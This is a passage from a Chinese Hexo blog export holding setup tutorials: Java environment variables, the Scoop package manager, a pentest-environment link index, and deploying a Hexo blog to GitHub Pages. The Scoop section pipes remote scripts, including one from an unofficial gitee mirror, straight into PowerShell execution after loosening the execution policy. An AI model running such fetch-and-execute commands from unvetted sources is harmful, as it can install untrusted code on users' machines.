bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">vim  .bash_profile</span><br><span class="line"><span class="built_in">export</span> </span><br><span class="line">JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/(java安装目录)</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scoop 包管理器</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Scoop简介"><a href="#Scoop简介" class="headerlink" title="Scoop简介"></a>Scoop简介</h1><blockquote><p>更多信息查看官网：<a href="https://scoop.sh/">https://scoop.sh</a></p></blockquote><p>Windows命令行包管理工具</p><ul><li>命令行安装软件</li><li>命令行管理软件</li><li>自动配置环境变量</li><li>自动管理程序依赖</li></ul><h1 id="Scoop安装"><a href="#Scoop安装" class="headerlink" title="Scoop安装"></a>Scoop安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在 PowerShell 中打开远程权限</span><br><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser;</span><br><span class="line">2. 自定义 Scoop 安装目录</span><br><span class="line">$env:SCOOP=&#x27;D:\scoop&#x27;</span><br><span class="line"># 用户环境变量</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)</span><br><span class="line"># 系统环境变量</span><br><span class="line"># [Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;)</span><br><span class="line">如果跳过该步骤， Scoop 将默认把所有用户安装的 App 和 Scoop 本身置于 C:\Users\user_name\scoop</span><br><span class="line">3. 下载并安装 Scoop</span><br><span class="line">iwr -useb get.scoop.sh | iex</span><br><span class="line">Initializing...</span><br><span class="line">Downloading...</span><br><span class="line">Extracting...</span><br><span class="line">Creating shim...</span><br><span class="line">Adding D:\scoop\shims to your path.</span><br><span class="line">Scoop was installed successfully!</span><br><span class="line">Type &#x27;scoop help&#x27; for instructions.</span><br><span class="line">scoop update</span><br><span class="line">==+国内镜像</span><br><span class="line">iwr -useb https://gitee.com/glsnames/scoop-installer/raw/master/bin/install.ps1 </span><br><span class="line">| iex</span><br><span class="line">scoop config SCOOP_REPO &#x27;https://gitee.com/glsnames/scoop-installer&#x27;</span><br><span class="line">scoop update</span><br><span class="line">4. 安装软件包</span><br><span class="line">scoop install &lt;app_name&gt;</span><br><span class="line">scoop install sudo</span><br><span class="line">5. 查看 Scoop 使用简介</span><br><span class="line">scoop help</span><br><span class="line">alias       管理 scoop 别名</span><br><span class="line">bucket      管理 Scoop buckets</span><br><span class="line">cache       显示或清除下载缓存</span><br><span class="line">cat         显示指定清单的内容。如果有的话，`bat&#x27;将被用于漂亮地打印JSON。</span><br><span class="line">checkup     检查潜在问题</span><br><span class="line">cleanup     通过删除旧版本清理应用程序</span><br><span class="line">config      获取或设置配置值</span><br><span class="line">create      创建自定义应用程序清单</span><br><span class="line">depends     列出一个应用程序的依赖项</span><br><span class="line">download    下载缓存文件夹中的应用程序并验证哈希值</span><br><span class="line">export      导出（可导入）已安装的应用程序的列表</span><br><span class="line">help        显示一个命令的帮助</span><br><span class="line">hold        按住一个应用程序以禁用更新</span><br><span class="line">home        打开应用程序的主页</span><br><span class="line">info        显示一个应用程序的信息</span><br><span class="line">install     安装应用</span><br><span class="line">list        列出已安装的应用程序</span><br><span class="line">prefix      返回指定应用程序的路径</span><br><span class="line">reset       重置一个应用程序以解决冲突</span><br><span class="line">search      搜索可用的应用程序</span><br><span class="line">shim        操纵Scoop shims</span><br><span class="line">status      显示状态并检查新的应用程序版本</span><br><span class="line">unhold      解除对一个应用程序的控制，使其能够更新</span><br><span class="line">uninstall   卸载一个应用程序</span><br><span class="line">update      新应用程序或Scoop本身</span><br><span class="line">virustotal  在virustotal.com上寻找应用程序的哈希值</span><br><span class="line">which       找到一个shim/executable（类似于Linux上的&#x27;which&#x27;）</span><br></pre></td></tr></table></figure><h1 id="Scoop使用"><a href="#Scoop使用" class="headerlink" title="Scoop使用"></a>Scoop使用</h1><ol><li>添加bucket</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># powershell添加代理</span><br><span class="line">$Env:HTTP_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">$Env:HTTPS_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># cmd添加代理</span><br><span class="line">set http_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">set https_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># 添加 bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 列出添加的 bucket</span><br><span class="line">scoop bucket list</span><br><span class="line">Name Source                                 Updated           Manifests</span><br><span class="line">---- ------                                 -------           ---------</span><br><span class="line">main https://github.com/ScoopInstaller/Main 2022/5/3 20:31:35      1015</span><br><span class="line"># 查看官方推荐的 bucket</span><br><span class="line">scoop bucket known</span><br><span class="line">main</span><br><span class="line">extras</span><br><span class="line">versions</span><br><span class="line">nirsoft</span><br><span class="line">php</span><br><span class="line">nerd-fonts</span><br><span class="line">nonportable</span><br><span class="line">java</span><br><span class="line">games</span><br></pre></td></tr></table></figure><ol start="2"><li>安装应用：以 7zip  为例</li></ol><blockquote><p><a href="https://scoop.sh/#/apps?q=7zip">https://scoop.sh/#/apps?q=7zip</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索 7zip 应用</span><br><span class="line">scoop search 7zip</span><br><span class="line">&#x27;main&#x27; bucket:</span><br><span class="line">    7zip (21.07)</span><br><span class="line">    7zip19.00-helper (19.00)</span><br><span class="line"># 添加 main bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 安装 7zip</span><br><span class="line">scoop install 7zip</span><br><span class="line">Installing &#x27;7zip&#x27; (21.07) [64bit]</span><br><span class="line">7z2107-x64.msi (1.8 MB) </span><br><span class="line">[===============================================================================</span><br><span class="line">======] 100%</span><br><span class="line">Checking hash of 7z2107-x64.msi ... ok.</span><br><span class="line">Extracting 7z2107-x64.msi ... done.</span><br><span class="line">Linking D:\scoop\apps\7zip\current =&gt; D:\scoop\apps\7zip\21.07</span><br><span class="line">Creating shim for &#x27;7z&#x27;.</span><br><span class="line">Creating shortcut for 7-Zip (7zFM.exe)</span><br><span class="line">Persisting Codecs</span><br><span class="line">Persisting Formats</span><br><span class="line">Running post-install script...</span><br><span class="line">&#x27;7zip&#x27; (21.07) was installed successfully!</span><br><span class="line">Notes</span><br><span class="line">-----</span><br><span class="line">Add 7-Zip as a context menu option by running: </span><br><span class="line">&quot;D:\scoop\apps\7zip\current\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看 scoop 安装的应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop list</span><br><span class="line">Installed apps:</span><br><span class="line">Name Version Source Updated             Info</span><br><span class="line">---- ------- ------ -------             ----</span><br><span class="line">7zip 21.07   main   2022-05-03 23:05:15</span><br></pre></td></tr></table></figure><ol start="4"><li>查看应用信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop status 7zip</span><br><span class="line">scoop info 7zip</span><br><span class="line">Name        : 7zip</span><br><span class="line">Description : A multi-format file archiver with high compression ratios</span><br><span class="line">Version     : 21.07</span><br><span class="line">Bucket      : main</span><br><span class="line">Website     : https://www.7-zip.org</span><br><span class="line">License     : LGPL-2.1-or-later</span><br><span class="line">Updated at  : 2022/4/4 17:24:43</span><br><span class="line">Updated by  : Issac Lin</span><br><span class="line">Installed   : 21.07</span><br><span class="line">Binaries    : 7z.exe</span><br><span class="line">Shortcuts   : 7-Zip</span><br><span class="line">Notes       : Add 7-Zip as a context menu option by running: &quot;&lt;root&gt;\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="5"><li>Scoop更新应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 更新scoop</span><br><span class="line">scoop update</span><br><span class="line"># 更新7zip</span><br><span class="line">scoop update 7zip</span><br><span class="line"># 更新全部</span><br><span class="line">scoop *</span><br></pre></td></tr></table></figure><ol start="6"><li>卸载删除应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop uninstall 7zip</span><br><span class="line">Uninstalling &#x27;7zip&#x27; (21.07).</span><br><span class="line">Removing shim &#x27;7z.shim&#x27;.</span><br><span class="line">Removing shim &#x27;7z.exe&#x27;.</span><br><span class="line">Removing shortcut ~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Scoop Apps\7-Zip.lnk</span><br><span class="line">Unlinking D:\scoop\apps\7zip\current</span><br><span class="line">&#x27;7zip&#x27; was uninstalled.</span><br></pre></td></tr></table></figure><h1 id="Scoop下载加速"><a href="#Scoop下载加速" class="headerlink" title="Scoop下载加速"></a>Scoop下载加速</h1><ol><li>安装 Aria2 来加速下载</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install aria2</span><br></pre></td></tr></table></figure><ol start="2"><li>如果使用代理，有时需要通过如下命令关闭 aria2</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled false</span><br></pre></td></tr></table></figure><ol start="3"><li>aria2 在 Scoop 中默认开启</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled true</span><br></pre></td></tr></table></figure><ol start="4"><li>其他参数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-retry-wait 4</span><br><span class="line">scoop config aria2-split 16</span><br><span class="line">scoop config aria2-max-connection-per-server 16</span><br><span class="line">scoop config aria2-min-split-size 4M</span><br></pre></td></tr></table></figure><h1 id="Scoop调用管理员"><a href="#Scoop调用管理员" class="headerlink" title="Scoop调用管理员"></a>Scoop调用管理员</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install sudo </span><br><span class="line">sudo cmd.exe</span><br></pre></td></tr></table></figure><h1 id="Scoop其他bucket"><a href="#Scoop其他bucket" class="headerlink" title="Scoop其他bucket"></a>Scoop其他bucket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">scoop update</span><br></pre></td></tr></table></figure><h1 id="Scoop创建安装程序"><a href="#Scoop创建安装程序" class="headerlink" title="Scoop创建安装程序"></a>Scoop创建安装程序</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop create url</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;:  &quot;&quot;,  // 版本</span><br><span class="line">    &quot;license&quot;:  &quot;&quot;,</span><br><span class="line">    &quot;extract_dir&quot;:  &quot;&quot;, // 解压目录</span><br><span class="line">    &quot;url&quot;:  &quot;&quot;,  下载url地址</span><br><span class="line">    &quot;homepage&quot;:  &quot;&quot;,  // 官网主页</span><br><span class="line">    &quot;hash&quot;:  &quot;&quot;,  // 安装文件或压缩包sha256 hash值</span><br><span class="line">    &quot;bin&quot;:  &quot;&quot; // 应用程序名</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoop install .\app.json</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 包管理器 </tag>
            
            <tag> scoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x01 - 环境搭建</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x01-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x01-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透工具环境安装"><a href="#渗透工具环境安装" class="headerlink" title="渗透工具环境安装"></a><strong>渗透工具环境安装</strong></h1><h2 id="scoop-包管理器"><a href="#scoop-包管理器" class="headerlink" title="scoop 包管理器"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/">scoop 包管理器</a></h2><h2 id="Java环境安装"><a href="#Java环境安装" class="headerlink" title="Java环境安装"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">Java环境安装</a></h2><h2 id="Python环境安装"><a href="#Python环境安装" class="headerlink" title="Python环境安装"></a>Python环境安装</h2><blockquote><p><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">Python环境安装</a></p></blockquote><h1 id="Linux-Kali配置与使用"><a href="#Linux-Kali配置与使用" class="headerlink" title="Linux-Kali配置与使用"></a><strong><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/">Linux-Kali配置与使用</a></strong></h1><h2 id="VMware软件安装"><a href="#VMware软件安装" class="headerlink" title="VMware软件安装"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/">VMware软件安装</a></h2><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/">Linux基础</a></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-在GitHub部署hexo个人博客</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>由于比较懒不想操心博客的运维，而且腾讯云的服务器也快到期了，就先将Blog部署在GitHub上吧。</p><h1 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h1><p>hexo是一款快速、简洁且高效的博客框架，支持markdown写作（选择hexo的另一个原因），可以快速的生成静态网页，而且插件丰富。优点还是不少，就不一一赘述。附上官网链接。</p><blockquote><p><a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p></blockquote><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>安装 Hexo 相当简单，只需要先安装node.js和git（git安装方法自行百度）</p><blockquote><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li><li><a href="https://blog.csdn.net/antma/article/details/86104068">node.js安装参考这位大佬的教程</a></li></ul></blockquote><ol><li>npm安装hexo包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完hexo包可用<code>npm hexo-cli -v</code>查看版本，相应的目录下会有变化</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142002229.png" alt="image-20220814200222125" style="zoom:50%;" /><ol start="2"><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>，执行命令</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141958704.png" alt="image-20220814195830542" style="zoom:50%;" /><ol start="3"><li>开始建站，执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init .\myblog</span><br><span class="line">cd myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142012267.png" alt="image-20220814201251111" style="zoom:50%;" /><blockquote><p>这些目录里面放了什么文件可以参考<a href="https://hexo.io/zh-cn/docs/setup">官方文档</a></p></blockquote><h1 id="使用hexo创作"><a href="#使用hexo创作" class="headerlink" title="使用hexo创作"></a>使用hexo创作</h1><ol><li>新建FirstBlog，执行下面命令后，会自动在<code>myblog\source\\_posts</code>目录下创建名为<code>firtblog.md</code>的文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;FirstBlog&quot;</span></span><br><span class="line">或者简写为</span><br><span class="line">hexo n <span class="string">&quot;FirstBlog&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142028651.png" alt="image-20220814202817526" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142030299.png" alt="image-20220814203052183" style="zoom:50%;" /><ol start="2"><li>hexo渲染markdown文件，生成html等静态页面：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">或者</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>生成的文件都在<code>myblog\public</code>目录下</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142036923.png" alt="image-20220814203631732" style="zoom:50%;" /><ol start="3"><li>本地启动服务测试一下：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line">或者</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142038525.png" alt="image-20220814203848381" style="zoom:50%;" /><blockquote><p>这个服务开启的端口可以myblog\node_modules&#x2F;hexo-server&#x2F;index.js 文件中修改(因为有时候存在端口占用的情况)</p></blockquote><p>这个时候可以看到，成功了，但是略丑~，不急，后面可以换主题美化-</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142044320.png" alt="image-20220814204418980" style="zoom:50%;" /><h1 id="GitHub部署Blog"><a href="#GitHub部署Blog" class="headerlink" title="GitHub部署Blog"></a>GitHub部署Blog</h1><ol><li>先在GitHub上创立一个仓库，单击new~，：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142017620.png" alt="image-20220814201720473" style="zoom:50%;" /><ol start="2"><li>Repository name设为<code>Yourname.github.io</code>，其他默认即可</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142021969.png" alt="image-20220814202142829" style="zoom:50%;" /><p>可以在setting中查看是否成功，若成功会显示url：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142213278.png" alt="image-20220814221305122" style="zoom: 33%;" /><ol start="3"><li>打开<code>myblog\\_config.yml</code>这个文件，可以自行配置，参数太多不一一讲解。需要注意的是deploy选项</li></ol><blockquote><p>同理参考官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142048690.png" alt="image-20220814204826516" style="zoom:50%;" /><p>找到deploy选项：</p><blockquote><ul><li><p>同理可以参考官方文档：<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p></li><li><p><strong>注意yaml文件中的缩进</strong>：YAML依靠缩进来确定元素间的从属关系。因此，请确保每个deployer的缩进长度相同，并且使用空格缩进。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://bitbucket.org/John/john.bitbucket.io  #修改为自己GitHub仓库的url</span><br><span class="line">  branch: main#主分支，因人而异</span><br></pre></td></tr></table></figure><ol start="4"><li>git安装部署插件 <a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><ol start="5"><li>重新生成站点文件并推送至远程库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line">解释：</span><br><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo generate  #渲染 生成静态文件</span><br><span class="line">hexo deploy       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><ol start="6"><li>打开浏览器，输入自己的url：<a href="https://11pmsleep.github.io/">https://11pmsleep.github.io/</a> 就可以看到是否成功：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142207744.png" alt="image-20220814220707328" style="zoom: 33%;" /><h1 id="自动化部署hexo-简化每次写博客的繁琐操作"><a href="#自动化部署hexo-简化每次写博客的繁琐操作" class="headerlink" title="自动化部署hexo-简化每次写博客的繁琐操作"></a>自动化部署hexo-简化每次写博客的繁琐操作</h1><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">比如说hexo每隔三十分钟自动更新</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不能同时用两次双引号怎么办？</span></span><br><span class="line">schtasks /create /sc MINUTE /mo 30 /tn hexo_update /tr &quot;cmd /c &quot;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个命令却意外的生成了正确的计划任务</span></span><br><span class="line">schtasks /create /sc MINUTE /mo 30 /tn hexo_update /tr &quot;cmd /c &#x27;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行结果</span></span><br><span class="line">成功: 成功创建计划任务 &quot;hexo_update&quot;。</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入taskschd.msc查看计划任务</span></span><br></pre></td></tr></table></figure><h3 id="图形化界面（推荐）"><a href="#图形化界面（推荐）" class="headerlink" title="图形化界面（推荐）"></a>图形化界面（推荐）</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022159661.png" alt="image-20220902215958413" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022209833.png" alt="image-20220902220949582" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210135.png" alt="image-20220902221014958" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210895.png" alt="image-20220902221042649" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210792.png" alt="image-20220902221059540" style="zoom:50%;" /><h2 id="批处理文件或者bash脚本"><a href="#批处理文件或者bash脚本" class="headerlink" title="批处理文件或者bash脚本"></a>批处理文件或者bash脚本</h2><blockquote><p>hexo_update.bat</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chdir</span> F:\Haoran\桌面\myblog </span><br><span class="line">hexo g <span class="literal">-d</span></span><br></pre></td></tr></table></figure><h1 id="换个好看的主题"><a href="#换个好看的主题" class="headerlink" title="换个好看的主题~"></a>换个好看的主题~</h1><blockquote><p>换主题同样是参考文档：<a href="https://hexo.io/zh-cn/docs/themes">https://hexo.io/zh-cn/docs/themes</a></p><p>总而言之~文档里什么都有</p></blockquote><p>我选用的是<a href="https://butterfly.js.org/posts/21cfbf15/">butterfly</a>，因为这个名字很喜欢</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>在myblog目录下git拉取主题文件即可</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line">如果需更新，主题目录下 git pull即可</span><br><span class="line">在myblog\themes目录下可以看到新增主题butterfly</span><br></pre></td></tr></table></figure><ol start="2"><li>应用主题</li></ol><p>在myblog的目录下 _config.yml，把主题改为主题目录的名字butterfly</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151501667.png" alt="image-20220815150108479" style="zoom:50%;" /><ol start="3"><li>该主题需要我们额外安装插件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你没有 pug 以及 stylus 的渲染器，请下载安装：</span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><ol start="4"><li>最后重新加载和推送一下就可以看到成果了~~</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">或者直接hexo generate --deploy也是一样的。 Hexo 在生成完毕后自动部署网站</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151518872.png" alt="image-20220815151820608" style="zoom: 33%;" /><p>更详细的配置参考butterfly官方文档吧~</p><h2 id="其他主题推荐"><a href="#其他主题推荐" class="headerlink" title="其他主题推荐"></a>其他主题推荐</h2><blockquote><p>4<a href="https://blinkfox.github.io/">https://blinkfox.github.io/</a></p><p>4<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>4<a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>3.5<a href="https://dogzi.fun/">https://dogzi.fun/</a></p><p>3.5<a href="https://github.com/shen-yu/hexo-theme-ayer">https://github.com/shen-yu/hexo-theme-ayer</a></p><p>3<a href="https://zhwangart.com/">https://zhwangart.com/</a></p><p>3<a href="https://liuyib.github.io/">https://liuyib.github.io/</a>支持多关键词搜索</p><p>3<a href="https://yuang01.github.io/">https://yuang01.github.io/</a>有弹幕</p><p>2.5<a href="https://molunerfinn.com/">https://molunerfinn.com/</a><a href="https://github.com/Molunerfinn/hexo-theme-melody">https://github.com/Molunerfinn/hexo-theme-melody</a></p><p>2.5<a href="http://fech.in/">http://fech.in/</a><a href="https://github.com/Fechin/hexo-theme-diaspora">https://github.com/Fechin/hexo-theme-diaspora</a></p><p>2<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></p><p>1.5<a href="https://haojen.github.io/Claudia-theme-blog/">https://haojen.github.io/Claudia-theme-blog/</a></p><p>1<a href="https://volantis.js.org/examples/">https://volantis.js.org/examples/</a><a href="https://github.com/volantis-x/hexo-theme-volantis">https://github.com/volantis-x/hexo-theme-volantis</a></p><p>1<a href="https://github.com/Chorer/hexo-theme-PureBlue">https://github.com/Chorer/hexo-theme-PureBlue</a></p><p>1<a href="https://shuoit.net/">https://shuoit.net/</a></p><p>0.5<a href="https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/">https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/</a></p><p>0.5<a href="https://mser.xyz/">https://mser.xyz/</a></p><p><a href="http://ghaseminya.ir/">http://ghaseminya.ir/</a></p></blockquote><h1 id="refer："><a href="#refer：" class="headerlink" title="refer："></a>refer：</h1><blockquote><ul><li><p><a href="https://hexo.io/docs/troubleshooting.html#Git-Deployment-Problems">故障排错参考官方文档</a></p></li><li><p><a href="https://butterfly.js.org/posts/dc584b87/">butterfly安装文档</a></p></li><li><p><a 